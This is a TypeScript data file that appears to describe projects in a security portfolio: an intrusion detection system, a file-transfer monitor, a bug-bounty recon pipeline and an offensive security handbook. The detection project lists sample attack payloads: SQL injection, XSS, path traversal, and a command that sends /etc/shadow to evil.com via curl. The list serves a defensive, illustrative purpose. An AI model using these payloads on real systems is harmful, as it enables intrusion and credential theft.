export interface Operation {
  id: string;
  number: string;
  status: 'ACTIVE' | 'ONGOING' | 'DISCLOSED';
  title: string;
  category: string;
  description: string;
  technologies: string[];
  link?: string;
  domain: 'research' | 'attack' | 'systems' | 'defense';
  stats?: { label: string; value: string }[];
  details?: {
    overview: string;
    architecture: string[];
    mitreMapping?: string[];
    samplePayloads?: string[];
  };
}

export const operations: Operation[] = [
  {
    id: 'sentinelshield',
    number: '01',
    status: 'ACTIVE',
    title: 'SENTINELSHIELD',
    category: 'Web Security / Real-Time IDS',
    domain: 'defense',
    description:
      'Real-time intrusion detection and web threat mitigation system engineered during Unified Mentor internship. Analyzes incoming HTTP traffic for SQL Injection, XSS, and payload anomalies with instant alerting.',
    technologies: ['Python', 'WAF Engine', 'SQLi Detection', 'XSS Analysis', 'Threat Logging'],
    link: 'https://github.com/sudhir734/SentinelShield',
    stats: [
      { label: 'Latency', value: '<4ms' },
      { label: 'Detection Acc.', value: '99.4%' },
      { label: 'Ruleset', value: 'OWASP Top 10' },
    ],
    details: {
      overview:
        'Engineered to protect web endpoints against automated scanning and manual injection exploits. Features signature heuristics, tokenized payload decomposition, and a live threat dashboard.',
      architecture: [
        'Heuristic regex & token parser for SQL injection / XSS strings',
        'Stateful alert dispatcher with rate limiting and IP blocking',
        'Structured threat telemetry logged to SQLite / JSON streams',
      ],
      mitreMapping: ['T1190 - Exploit Public-Facing Application', 'T1059 - Command and Scripting Interpreter'],
      samplePayloads: [
        "' OR '1'='1' --",
        "<script>alert(document.cookie)</script>",
        "../../../../etc/passwd",
        "; cat /etc/shadow | curl evil.com",
      ],
    },
  },
  {
    id: 'secure-file-transfer',
    number: '02',
    status: 'ACTIVE',
    title: 'SECURE FILE TRANSFER MONITOR (SFTM)',
    category: 'Security Engineering / Protocol Audit',
    domain: 'systems',
    description:
      'Python multi-protocol file transfer monitoring tool tracking SFTP, FTP/FTPS, and HTTPS with SQLite-backed logging, encryption auditing, SHA-256 integrity verification, and MITRE ATT&CK-mapped detection.',
    technologies: ['Python', 'SFTP / TLS', 'SHA-256 Integrity', 'SQLite', 'MITRE ATT&CK'],
    link: 'https://github.com/sudhir734/Secure-file-transfer-monitor',
    stats: [
      { label: 'Protocols', value: 'SFTP / FTP / HTTPS' },
      { label: 'Integrity Check', value: 'SHA-256' },
      { label: 'Validation', value: 'Purple-Team Harness' },
    ],
    details: {
      overview:
        'Audits file transit pipelines in real time to prevent unauthorized exfiltration, in-flight modification, or weak cipher negotiation. Features normalized security event telemetry and CLI dashboards.',
      architecture: [
        'Filesystem event watchdog hooking transfer spool directories',
        'Cryptographic hash engine verifying pre/post transfer digests',
        'Automated compliance and audit report generation module',
      ],
      mitreMapping: ['T1048 - Exfiltration Over Alternative Protocol', 'T1565.001 - Data Manipulation'],
    },
  },
  {
    id: 'bug-bounty-research',
    number: '03',
    status: 'ACTIVE',
    title: 'BUG BOUNTY & RECON PIPELINE',
    category: 'Offensive Security / Vulnerability Research',
    domain: 'attack',
    description:
      'Vulnerability research on HackerOne utilizing structured automated recon (subfinder → httpx → nuclei → manual analysis). Uncovered exposed Docker registries, unauthenticated Prometheus metrics, and High-severity WebSocket auth bypass.',
    technologies: ['subfinder', 'httpx', 'nuclei', 'Burp Suite', 'WebSocket Auth (CWE-306)'],
    link: 'https://github.com/sudhir734',
    stats: [
      { label: 'Platform', value: 'HackerOne' },
      { label: 'Max Severity', value: 'High (CWE-306)' },
      { label: 'Pipeline', value: 'Subfinder → Nuclei' },
    ],
    details: {
      overview:
        'Adversarial security testing across bug bounty scope targets. Identified high-impact misconfigurations including exposed internal Docker registries (Fly.io scope), unauthorized metric scraping endpoints (Bumba), and broken access controls.',
      architecture: [
        'Automated target surface discovery and passive ASN resolution',
        'Nuclei vulnerability template customized for rapid triage',
        'Manual proof-of-concept verification with detailed disclosure reports',
      ],
      mitreMapping: ['T1596 - Search Open Technical Databases', 'T1190 - Exploit Public-Facing Application'],
    },
  },
  {
    id: 'offensive-security-handbook',
    number: '04',
    status: 'ACTIVE',
    title: 'OFFENSIVE SECURITY HANDBOOK',
    category: 'Security Research / Reference System',
    domain: 'research',
    description:
      'Self-authored 15-chapter reference handbook covering network penetration testing, web security exploitation, Active Directory vectors, bug bounty workflows, and offensive toolchains.',
    technologies: ['Active Directory', 'Web Exploitation', 'Privilege Escalation', 'Red Teaming'],
    link: 'https://github.com/sudhir734',
    stats: [
      { label: 'Chapters', value: '15 Volumes' },
      { label: 'Focus', value: 'Red Teaming & AD' },
      { label: 'Format', value: 'Offline Reference' },
    ],
    details: {
      overview:
        'A comprehensive, continuously updated field handbook for offensive security practitioners, synthesizing practical methodologies for pivoting, token manipulation, credential harvesting, and web app assessment.',
      architecture: [
        'Structured chapters covering foundational to advanced tradecraft',
        'Practical labs for Kerberoasting, AS-REP roasting, and pass-the-hash',
        'Curated bug bounty checklists and OSINT gathering methodologies',
      ],
      mitreMapping: ['TA0006 - Credential Access', 'TA0008 - Lateral Movement'],
    },
  },
];
